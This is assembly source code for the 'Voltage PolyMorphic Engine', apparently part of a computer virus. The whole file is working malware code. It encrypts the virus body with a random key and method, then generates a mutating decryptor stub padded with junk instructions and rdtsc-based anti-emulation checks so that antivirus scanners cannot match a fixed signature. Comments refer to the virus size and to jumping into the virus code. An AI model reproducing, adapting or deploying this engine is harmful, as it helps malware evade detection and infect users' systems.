;Voltage PolyMorphic Engine:
;---------------------------
;encrypt code with 4 bytes key with diffrent way each time
;and create polymorphic decryptor,the polymorphic decryptor
;has diffrent instructions that do the same thing mixed with
;junk code & anti emulation trixs


CreateDecryptor:
	call	InitRandomNumber	;init random number generator
	call	GenRandomNumber
	and	eax,1f40h		;get random numebr between 0 ~ 8000
	cmp	eax,7d0h
	ja	NextM
	mov	byte ptr [ebp + EncryptionMethod],1h ;use not
	jmp	EncryptVirus
NextM:	cmp	eax,0fa0h
	ja	NextM2
	mov	byte ptr [ebp + EncryptionMethod],2h ;use add
	jmp	EncryptVirus
NextM2:	cmp	eax,1770h
	ja	NextM3
	mov	byte ptr [ebp + EncryptionMethod],3h ;use sub
	jmp	EncryptVirus
NextM3:	mov	byte ptr [ebp + EncryptionMethod],4h ;use xor
EncryptVirus:
	call	GenRandomNumber
	mov	dword ptr [ebp + key],eax	;get random key
	xor	eax,eax
	mov	ecx,SizeOfDataToEncrypt		;size of data in words
	mov	edi,[ebp + StartOfDataToEncrypt]
	mov	esi,edi
@enc:	lodsd
	cmp	byte ptr [ebp + EncryptionMethod],1h	;is not	?
	jne	NextE
	not	eax
	jmp	_stosw
NextE:	cmp	byte ptr [ebp + EncryptionMethod],2h	;is add ?
	jne	NextE2
	add	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE2:	cmp	byte ptr [ebp + EncryptionMethod],3h	;is sub	?
	jne	NextE4
	sub	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE4: xor	eax,dword ptr [ebp + key]		;xor
_stosw:	stosd
	loop	@enc
	mov	edi,[ebp + WhereToWriteDecryptor]
	call	WriteAntiEmulation
	call	WriteJunkCode
	call	WriteInstruction2
	call	WriteJunkCode
	call	WriteInstruction3
	call	WriteJunkCode
	call	WriteInstruction4
	call	WriteJunkCode
	mov	dword ptr [ebp + PolyBuffer],edi	;saved for loop
	call	WriteInstruction5
	call	WriteJunkCode
	call	WriteInstruction6
	call	WriteJunkCode
	call	WriteInstruction7
	call	WriteJunkCode
	call	WriteInstruction8
	call	WriteJunkCode
	call	WriteInstruction9
	call	WriteJunkCode
	ret
	
	EncryptionMethod	db	0	;1=not 2=add 3=sub 4=xor
	key			dd	0
	SizeOfDecryptor		dd	0
	WhereToWriteDecryptor	dd	0
	StartOfDataToEncrypt	dd	0
	ProgramImageBase	dd	0
	PolyBuffer		dd	0
	SizeOfDataToEncrypt	equ	(VirusSize/4);virus size in dwords
	FixRVA			dd	0
	HostEntryPoint		dd	offset FakeHost
	
WriteAntiEmulation:
;write a code that jump only if at some times using the rdtsc instruction
	mov	al,60h
	stosb					;gen pushad

	mov	ax,310Fh
	stosw					;gen rdtsc
	
	;gen code to check random bit of eax
	
	call	GenRandomNumber
	cmp	al,0a0h				;use rcl or rcr ?
	ja	GenRclx
	
	mov	ax,0d8c1h			;rcr
	jmp	xGenXX
GenRclx:mov	ax,0d0c1h			;rcl
xGenXX:	stosw
	
	call	GenRandomNumber
	stosb
	
	
	;gen jc or jnc to exit procedure code
	
	call	GenRandomNumber
	
	cmp	al,0a0h
	ja	GenxJc
	mov	ax,0873h
	jmp	Xjmp
GenxJc:	mov	ax,0872h
Xjmp:	stosw
	
	;gen code to restore registers & return to host (most be 8 bytes)
	
	mov	al,61h
	stosb					;gen popad
	
	call	GenRandomNumber
	cmp	al,0a0h				;use rcl or rcr ?
	ja	_xAntiE2
	
	mov	al,0b8h				;gen mov eax
	stosb
	mov	eax,[ebp + HostEntryPoint]
	stosd
	mov	ax,0e0ffh			;gen jmp eax
	stosw
	
	jmp	_xAntiGP	
_xAntiE2:	
	
	mov	al,68h
	stosb					;gen push
	
	mov	eax,[ebp + HostEntryPoint]
	stosd	
	
	mov	ax,0ccc3h			;gen ret & int 3(as padding)
	stosw
	

_xAntiGP:
	mov	al,61h
	stosb					;gen popad


	ret
		
WriteInstruction2:
	;this function set esi register to start of encrypted virus
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]
	and	eax,0ffh		;get random number between 0 ~ 255
	cmp	eax,33h
	ja	ins2_1
	mov	byte ptr [edi],0beh	;way 1:
	mov	dword ptr [edi + 1],ebx	;mov esi,StartOfDataToEncrypt
	add	edi,5h
	jmp	retins2
ins2_1:	cmp	eax,66h
	ja	ins2_2
	mov	byte ptr [edi],68h	;way 2:
	mov	dword ptr [edi + 1],ebx	;push	StartOfDataToEncrypt
	add	edi,5h
	call	WriteJunkCode		;pop	esi
	mov	byte ptr [edi],5eh
	inc	edi
	jmp	retins2
ins2_2:	cmp	eax,99h
	ja	ins2_3
	mov	word ptr [edi],0f633h	;way 3:
	add	edi,2h			;xor esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival
	jmp	retins2
ins2_3:	cmp	eax,0cch
	ja	ins2_4
	mov	word ptr [edi],0f62bh	;way 4
	add	edi,2h			;sub esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival		
	jmp	retins2
ins2_4:	not	ebx			;way 5
	mov	byte ptr [edi],0beh	;mov esi,not StartOfDataToEncrypt
	mov	dword ptr [edi + 1],ebx	
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d6f7h	;not esi
	add	edi,2h
retins2:ret
_ins2oresival:
	;write or esi,StartOfDataToEncrypt instruction
	mov	word ptr [edi],0ce81h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
	
WriteInstruction3:
	;this function set edi register to esi register
	call	GenRandomNumber
	and	eax,0c8h
	cmp	eax,32h
	ja	ins3_1
	mov	word ptr [edi],0fe8bh	;mov edi,esi
	add	edi,2h
	jmp	retins3
ins3_1: cmp	eax,64h
	ja	ins3_2
	mov	byte ptr [edi],56h	;push esi
	inc	edi
	call	WriteJunkCode
	mov	byte ptr [edi],5fh	;pop edi
	inc	edi
	jmp	retins3
ins3_2:	cmp	eax,96h
	ja	ins3_3
	mov	word ptr [edi],0fe87h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
	jmp	retins3
ins3_3:	mov	word ptr [edi],0f787h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
retins3:ret

WriteInstruction4:
	;this function set ecx with the size of the virus in dwords
	call	GenRandomNumber
	mov	ebx,SizeOfDataToEncrypt
	and	eax,0ffh
	cmp	eax,33h
	ja	ins4_1
	mov	byte ptr [edi],0b9h	;mov ecx,sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins4	
ins4_1:	cmp	eax,66h
	ja	ins4_2
	mov	byte ptr [edi],68h	;push sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	byte ptr [edi],59h	;pop ecx
	inc	edi
	jmp	retins4	
ins4_2:	cmp	eax,99h
	ja	ins4_3
	mov	word ptr [edi],0c933h	;xor ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4	
ins4_3:	cmp	eax,0cch
	ja	ins4_4
	mov	word ptr [edi],0c92bh	;sub ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4
ins4_4: not	ebx
	mov	byte ptr [edi],0b9h	;mov ecx,not sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d1f7h
	add	edi,2h
retins4:ret
_ins4orecxval:
	mov	word ptr [edi],0c981h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
WriteInstruction5:
	;this function read 4 bytes from [esi] into eax
	;and add to esi register 4 (if there is need to do so).
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,64h
	ja	ins5_1
	mov	byte ptr [edi],0adh	;lodsd
	inc	edi
	jmp	retins5
ins5_1:	cmp	eax,0c8h
	ja	ins5_2
	mov	word ptr [edi],068bh	;mov eax,dword ptr [esi]
	add	edi,2h
	call	_ins5addesi4
	jmp	retins5
ins5_2:	mov	word ptr [edi],36ffh	;push dword ptr [esi]
	add	edi,2h
	call	WriteJunkCode
	mov	byte ptr [edi],58h	;pop eax
	inc	edi
	call	_ins5addesi4
retins5:ret

_ins5addesi4:
	;this function write add to esi register 4
	call	GenRandomNumber
	and	eax,64h
	cmp	eax,32h
	ja	addesi4_2
	mov	word ptr [edi],0c683h	;way 1
	mov	byte ptr [edi + 2],4h	;add esi,4h
	add	edi,3h
	jmp	raddesi
addesi4_2:
	mov	ecx,4h		;way 2
@incesi:mov	byte ptr [edi],46h
	inc	edi
	call	WriteJunkCode
	loop	@incesi
raddesi:ret


WriteInstruction6:
	;this function decrypt the value of eax
	mov	ebx,dword ptr [ebp + key]
	cmp	byte ptr [ebp + EncryptionMethod],1h
	jne	ins6_1
	mov	word ptr [edi],0d0f7h	;not eax
	add	edi,2h
	jmp	retins6
ins6_1:	cmp	byte ptr [ebp + EncryptionMethod],2h
	jne	ins6_2
	mov	byte ptr [edi],2dh	;sub eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_2:	cmp	byte ptr [ebp + EncryptionMethod],3h
	jne	ins6_3
	mov	byte ptr [edi],05h	;add eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_3:	mov	byte ptr [edi],35h
	mov	dword ptr [edi + 1],ebx ;xor eax,key
	add	edi,5h
	jmp	retins6
retins6:ret




WriteInstruction7:
	;this function copy the value of eax to [edi]
	call	GenRandomNumber
	and	eax,258h
	cmp	eax,0c8h
	ja	ins7_1
	mov	byte ptr [edi],0abh	;stosd
	inc	edi
	jmp	retins7
ins7_1:	cmp	eax,190h
	ja	ins7_2
	mov	word ptr [edi],0789h	;mov dword ptr [edi],eax
	add	edi,2h
	call	WriteJunkCode
	call	addedi4
	jmp	retins7
ins7_2:	mov	byte ptr [edi],50h	;push eax
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],078fh	;pop dword ptr [edi]
	add	edi,2h
	call	addedi4
retins7:ret

addedi4:
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	_addedi4
	mov	word ptr [edi],0c783h
	mov	byte ptr [edi + 2],4h
	add	edi,3h
	jmp	retins7a
_addedi4:
	mov	ecx,4h
@incedi:mov	byte ptr [edi],47h	;inc edi
	inc	edi
	call	WriteJunkCode
	loop	@incedi
retins7a:ret


WriteInstruction8:
	;this function write the loop instruction of the decryptor
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	ins8_1
	mov	byte ptr [edi],49h	;dec ecx
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],0f983h
	mov	byte ptr [edi + 2],0h	;cmp ecx,0h
	add	edi,3h
	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],75h	;jne
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
	jmp	retins8
ins8_1:	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],0e2h	;loop
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
retins8:ret


WriteInstruction9:
	;this istruction write a code in the stack,that jump into virus code
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]			;offset to jump
	mov	dword ptr [ebp + push_and_ret + 1],ebx	;save address
	;push 'push offset' & 'ret' instructions to the stack
	;way 1:
	;	push xxx
	;	push xxx
	;way 2:
	;	mov	reg,xxx
	;	push	reg
	;	mov	reg,xxx
	;	push	reg
	;way 3:
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;------------------------------------------------------
	and	eax,4b0h
	cmp	eax,190h
	ja	I9_A
	xor	ecx,ecx				;way 1 !!!
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx	;gen push xxx
	add	edi,5h
	call	WriteJunkCode
	xor	ecx,ecx
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx		;gen push xxx
	add	edi,5h	
	jmp	I9_Exit
I9_A:	cmp	eax,320h
	ja	I9_B
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	call	GenMoveAndPush
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	call	GenMoveAndPush
	jmp	I9_Exit
I9_B:	call	GenRandomNumber
	xchg	ebx,eax
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	xor	eax,ebx
	call	GenMoveAndPush
	call	_WriteJunkCode
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	push	eax
	stosd
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	xor	eax,dword ptr [esp]
	call	GenMoveAndPush
	call	_WriteJunkCode
	pop	ebx
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	stosd
I9_Exit:
	Call	WriteJunkCode
	

	call	GenRandomNumber
	
	and	eax,1000h			;get num between 0 ~ 4k
	cmp	eax,400h
	ja	@GJE1

	
	call	GenRandomNumber
	
	push	eax				;save rnd in stack
	
	
	call	GenMovRegEsp

	
	xchg	eax,ecx
	mov	ecx,8h
	div	ecx
	xchg	eax,ecx
	
	mov	eax,[esp]

	call	CGenSubRegNum

	
	sub	cl,0e9h
	add	cl,51h
	xchg	cl,al
	stosb					;gen push reg
	
	;gen add dword ptr [esp],num
		
	mov	al,81h				;gen add
	stosb
	mov	ax,2404h			;dword ptr [esp]
	stosw
	pop	eax				;restore rnd number
	stosd
	mov	al,0c3h				;gen ret
	stosb

	jmp	ExtGJE
@GJE1:	cmp	eax,800h
	ja	@GJE2
		
		
	call	GenMovRegEsp

	xchg	eax,ecx
	mov	ecx,8h
	div	ecx

	add 	al,51h				;gen push reg
	stosb
	
	mov	al,0c3h				;gen ret
	stosb
	
	jmp	ExtGJE
@GJE2:	cmp	eax,0c00h
	ja	@GJE3
	mov	ax,0c354h			;gen push esp & ret
	stosw
	jmp	ExtGJE	
@GJE3:	mov	ax,0e4ffh			;gen jmp esp
	stosw
ExtGJE:	ret


	;instructions to generate in the stack:
	push_and_ret	db	68h,0,0,0,0,0c3h
	
GenXAntiEmulation:

	mov	al,50h
	stosb					;gen push eax
	
	call	_WriteJunkCode
	
	mov	ax,310Fh
	stosw					;gen rdtsc
		
	call	GenRandomNumber
	cmp	al,0a0h				;use rcl or rcr ?
	ja	GnRclx
	
	mov	ax,0d8c1h			;rcr
	jmp	xGnXX
GnRclx: mov	ax,0d0c1h			;rcl
xGnXX:	stosw
	
	call	GenRandomNumber
	stosb
	
	call	GenRandomNumber
	
	cmp	al,0a0h
	ja	GnxJc
	mov	ax,0f973h
	jmp	Xjmp2
GnxJc:	mov	ax,0f972h
Xjmp2:	stosw					;gen jc or jnc to exit procedure code
	
	call	_WriteJunkCode
	
	mov	al,58h				;gen pop eax
	stosb

	ret

			
;input:
;edi - dest
;cl  - reg index(0 ~ 6)
;eax - number ( if custom is used)
GenSubRegNum:
	call	GenRandomNumber
CGenSubRegNum:				;use custom number
	add	cl,0e9h
	cmp	cl,0ech
	jne	@gsrn
	mov	cl,0efh
@gsrn:	push	eax
	mov	ah,cl
	mov	al,81h
	stosw
	pop	eax
	stosd
	ret		
	
	
_WriteJunkCode:		;gen junk code that dont destroy registers
	call	GenRandomNumber
	and	eax,5208h
	cmp	eax,0bb8h
	ja	_WJC1
	call	GenAndReg
	jmp	ExitJC
_WJC1:	cmp	eax,1770h
	ja	_WJC2
	call	GenJump
	jmp	ExitJC
_WJC2:	cmp	eax,2328h
	ja	_WJC3
	call	GenPushPop
	jmp	ExitJC
_WJC3:	cmp	eax,2ee0h
	ja	_WJC4
	call	GenIncDec
	jmp	ExitJC
_WJC4:	cmp	eax,3a98h
	ja	_WJC5
	call	GenMoveRegReg
	jmp	ExitJC
_WJC5:	call	OneByte
ExitJC:	ret

;output cl:reg id
GenMovRegEsp:
	call	GenRandomNumber
	and	eax,00000600h
	mov	ecx,8h
	mul	ecx
	mov	cl,ah
	add	ah,0cch
	mov	al,8bh
	stosw
	ret	

;output ch:reg id
GenEmptyReg:
	call	GenRandomNumber
	xor	ecx,ecx
	and	eax,5208h	
	cmp	eax,0bb8h
	ja	_ER
	mov	ch,0c0h
	jmp	_ER_
_ER:	cmp	eax,1770h
	ja	_ER2
	mov	ch,0dbh
	jmp	_ER_
_ER2:	cmp	eax,2328h
	ja	_ER3
	mov	ch,0c9h
	jmp	_ER_
_ER3:	cmp	eax,2ee0h
	ja	_ER4
	mov	ch,0d2h
	jmp	_ER_
_ER4:	cmp	eax,3a98h
	ja	_ER5
	mov	ch,0ffh
	jmp	_ER_
_ER5:	mov	ch,0f6h
_ER_:	call	GenRandomNumber
	cmp	ah,80h
	ja	_ER__
	mov	cl,33h
	jmp	_E_R
_ER__:	mov	cl,2bh
_E_R:	mov	ax,cx
	stosw	
	ret
	

GenMoveAndPush:
	push	eax				;number to mov & push
No_Esp:	call	GenRandomNumber
	and	al,7h
	mov	cl,al
	add	al,0b8h
	cmp	al,0bch
	je	No_Esp
	stosb
	pop	eax
	stosd
	push	ecx
	call	_WriteJunkCode			;gen junk between the mov and the push
	pop	eax
	add	al,50h
	stosb
	ret
		
InitRandomNumber:
	call	[ebp + GetTickCount]
	xor	eax,[ebp + RandomNumber]
	mov	dword ptr [ebp + RandomNumber],eax
	ret
	RandomNumber	dd	0
GenRandomNumber:				;a simple random num generator
	pushad
	mov	eax,dword ptr [ebp + RandomNumber]
	and	eax,12345678h
	mov	cl,ah
	ror	eax,cl
	add	eax,98765abdh
	mov	ecx,12345678h
	mul	ecx
	add	eax,edx
	xchg	ah,al
	sub	eax,edx
	mov	dword ptr [ebp + RandomNumber],eax
	popad
	mov	eax,dword ptr [ebp + RandomNumber]
	ret

WriteJunkCode:
	call	GenRandomNumber			;split this procedure
	and	eax,3e8h			;to four procedure's
	cmp	eax,0fah			;in order to give each
	ja	_jnk1				;junkcode the same chance
	call	WriteJunkCode1
	jmp	ExitJunk
_jnk1:	cmp	eax,1f4h
	ja	_jnk2
	call	WriteJunkCode2
	jmp	ExitJunk
_jnk2:	cmp	eax,2eeh
	ja	_jnk3
	call	WriteJunkCode3
	jmp	ExitJunk
_jnk3:	call	WriteJunkCode4
ExitJunk:ret




WriteJunkCode1:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jnk_1
	call	GenAndReg	;1
	jmp	ExtJunk1
_jnk_1:	cmp	eax,1f4h
	ja	_jnk_2
	call	GenJump		;2
	jmp	ExtJunk1
_jnk_2:	cmp	eax,2eeh
	ja	_jnk_3
	call	GenPushPop	;3
	jmp	ExtJunk1
_jnk_3:	call	GenIncDec	;4
ExtJunk1:ret
	
	
WriteJunkCode2:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_jn_k1
	call	GenMoveRegReg	;5
	jmp	ExtJunk2
_jn_k1:	cmp	eax,1f4h
	ja	_jn_k2
	call	GenAnd		;6
	jmp	ExtJunk2
_jn_k2:	cmp	eax,2eeh
	ja	_jn_k3
	call	GenMove		;7
	jmp	ExtJunk2
_jn_k3:	call	GenPushTrashPopReg	;8
ExtJunk2:ret
	
	
WriteJunkCode3:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	_j_nk1
	call	GenShrReg	;9
	jmp	ExtJunk3
_j_nk1:	cmp	eax,1f4h
	ja	_j_nk2
	call	GenShlReg	;10
	jmp	ExtJunk3
_j_nk2:	cmp	eax,2eeh
	ja	_j_nk3
	call	GenRorReg	;11
	jmp	ExtJunk3
_j_nk3:	call	GenRolReg	;12
ExtJunk3:ret
	
	
WriteJunkCode4:
	call	GenRandomNumber
	and	eax,3e8h
	cmp	eax,0fah
	ja	__jnk1
	call	GenOrReg	;13
	jmp	ExtJunk4
__jnk1:	cmp	eax,1f4h
	ja	__jnk2
	call	GenXorReg	;14
	jmp	ExtJunk4
__jnk2:	cmp	eax,2eeh
	ja	__jnk3
	call	GenSubAddTrash	;15
	jmp	ExtJunk4
__jnk3:	call	GenXAntiEmulation;16
ExtJunk4:ret




GenAndReg:
	;this function generate and reg,reg instruction
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	and2
	mov	ah,0c0h
	jmp	exitand
and2:	cmp	eax,7d0h
	ja	and3
	mov	ah,0dbh
	jmp	exitand
and3:	cmp	eax,0bb8h
	ja	and4
	mov	ah,0c9h
	jmp	exitand
and4:	cmp	eax,0fa0h
	ja	and5
	mov	ah,0d2h
	jmp	exitand
and5:	cmp	eax,1388
	ja	and6
	mov	ah,0ffh
	jmp	exitand
and6:	cmp	eax,1770h
	ja	and7
	mov	ah,0f6h
	jmp	exitand
and7:	cmp	eax,1b58h
	ja	and8
	mov	ah,0edh
	jmp	exitand
and8:	mov	ah,0e4h
exitand:mov	al,23h
	stosw
	ret

GenJump:
	;this function generate do nothing condition jump
	call	GenRandomNumber
	and	eax,0fh
	add	eax,70h
	stosw
	ret

GenPushPop:
	;this function generate push reg \ pop reg instruction
	call	GenRandomNumber
	and	eax,7h
	add	eax,50h
	stosb
	add	eax,8h
	stosb
	ret

GenIncDec:
	;this function generate:inc reg\dec reg or dec reg\inc reg instruction
	call	GenRandomNumber
	cmp	al,7fh
	ja	decinc
	and	eax,7h
	add	eax,40h
	stosb
	add	eax,8h
	stosb
	jmp	exitincd
decinc:	and	eax,7h
	add	eax,48h
	mov	byte ptr [edi],al
	stosb
	sub	eax,8h
	mov	byte ptr [edi],al
	stosb
exitincd:ret


GenMoveRegReg:			;gen mov reg,reg
	call	GenRandomNumber
	and	eax,1f40h
	cmp	eax,3e8h
	ja	mreg2
	mov	ah,0c0h
	jmp	exitmreg
mreg2:	cmp	eax,7d0h
	ja	mreg3
	mov	ah,0dbh
	jmp	exitmreg
mreg3:	cmp	eax,0bb8h
	ja	mreg4
	mov	ah,0c9h
	jmp	exitmreg
mreg4:	cmp	eax,0fa0h
	ja	mreg5
	mov	ah,0d2h
	jmp	exitmreg
mreg5:	cmp	eax,1388
	ja	mreg6
	mov	ah,0ffh
	jmp	exitmreg
mreg6:	cmp	eax,1770h
	ja	mreg7
	mov	ah,0f6h
	jmp	exitmreg
mreg7:	cmp	eax,1b58h
	ja	mreg8
	mov	ah,0edh
	jmp	exitmreg
mreg8:	mov	ah,0e4h
exitmreg:
	mov	al,8bh
	stosw
	ret
	
GenAnd:
	;this function generate and ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nand1
	mov	ah,0e3h
	jmp	wand
nand1:	cmp	al,0a0h
	ja	nand2
	mov	ah,0e2h
	jmp	wand
nand2:	mov	ah,0e5h
wand:	mov	al,81h
	stosw
	pop	eax
	stosd
	ret
	
GenMove:
	;this function generate mov ebx\edx\ebp,trash instruction
	call	GenRandomNumber
	push	eax
	cmp	al,50h
	ja	nmov1
	mov	al,0bbh
	jmp	wmov
nmov1:	cmp	al,0a0h
	ja	nmov2
	mov	al,0bah
	jmp	wmov
nmov2:	mov	al,0bdh
wmov:	stosb
	pop	eax
	stosd
	ret

GenPushTrashPopReg:
	;this function generate push trash\ pop ebp\ebx\edx instruction
	call	GenRandomNumber
	mov	byte ptr [edi],68h
	inc	edi
	stosd
	cmp	al,55h
	ja	nextpt
	mov	byte ptr [edi],5dh
	jmp	wpop
nextpt:	cmp	al,0aah
	ja	nextpt2
	mov	byte ptr [edi],5ah
	jmp	wpop
nextpt2:mov	byte ptr [edi],5bh
wpop:	inc	edi
	ret	
	
GenShrReg:				;gen shr unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshr
	mov	byte ptr [edi],0edh
	jmp	wshr
nshr:	cmp	al,0a0h
	ja	nshr2
	mov	byte ptr [edi],0eah
	jmp	wshr
nshr2:	mov	byte ptr [edi],0ebh
wshr:	inc	edi
	stosb
	ret
	
GenShlReg:				;gen shl unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nshl
	mov	byte ptr [edi],0e3h
	jmp	wshl
nshl:	cmp	al,0a0h
	ja	nshl2
	mov	byte ptr [edi],0e2h
	jmp	wshl
nshl2:	mov	byte ptr [edi],0e5h
wshl:	inc	edi
	stosb
	ret
	
GenRorReg:				;gen ror unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nror
	mov	byte ptr [edi],0cbh
	jmp	wror
nror:	cmp	al,0a0h
	ja	nror2
	mov	byte ptr [edi],0cah
	jmp	wror
nror2:	mov	byte ptr [edi],0cdh
wror:	inc	edi
	stosb
	ret
	
	
GenRolReg:				;gen rol unusedreg,num
	call	GenRandomNumber
	mov	byte ptr [edi],0c1h
	inc	edi
	cmp	al,50h
	ja	nrol
	mov	byte ptr [edi],0c3h
	jmp	wrol
nrol:	cmp	al,0a0h
	ja	nrol2
	mov	byte ptr [edi],0c2h
	jmp	wrol
nrol2:	mov	byte ptr [edi],0c5h
wrol:	inc	edi
	stosb
	ret
	
GenOrReg:				;gen or unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nor
	mov	ah,0cbh
	jmp	wor
nor:	cmp	ah,0a0h
	ja	nor2
	mov	ah,0cah
	jmp	wor
nor2:	mov	ah,0cdh
wor:	stosw
	pop	eax
	stosd
	ret

GenXorReg:				;gen xor unusedreg,num
	call	GenRandomNumber
	push	eax
	mov	al,81h
	cmp	ah,50h
	ja	nXor
	mov	ah,0f3h
	jmp	wXor
nXor:	cmp	ah,0a0h
	ja	nXor2
	mov	ah,0f2h
	jmp	wXor
nXor2:	mov	ah,0f5h
wXor:	stosw
	pop	eax
	stosd
	ret


GenSubAddTrash:				;gen add reg,num\sub reg,num
noesp:	call	GenRandomNumber
	mov	ebx,eax
	cmp	al,80h
	ja	sub_f
	and	ah,7h
	add	ah,0c0h
	cmp	ah,0c4h
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0e8h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	jmp	exitsa
sub_f:	and	ah,7h
	add	ah,0e8h
	cmp	ah,0ech
	je	noesp
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
	mov	eax,ebx
	and	ah,7h
	add	ah,0c0h
	mov	al,81h
	stosw
	mov	eax,ebx
	stosd
exitsa:	ret

OneByte:				;gen one byte do nothing instruction
	call	GenRandomNumber
	cmp	al,32h
	ja	byte1
	mov	al,90h
	jmp	end_get_byte
byte1:	cmp	al,64h
	ja	byte2
	mov	al,0f8h
	jmp	end_get_byte
byte2:	cmp	al,96h
	ja	byte3
	mov	al,0f5h
	jmp	end_get_byte
byte3:	cmp	al,0c8h
	ja	byte4
	mov	al,0f9h
	jmp	end_get_byte
byte4:	mov	al,0fch
end_get_byte:
	stosb
	ret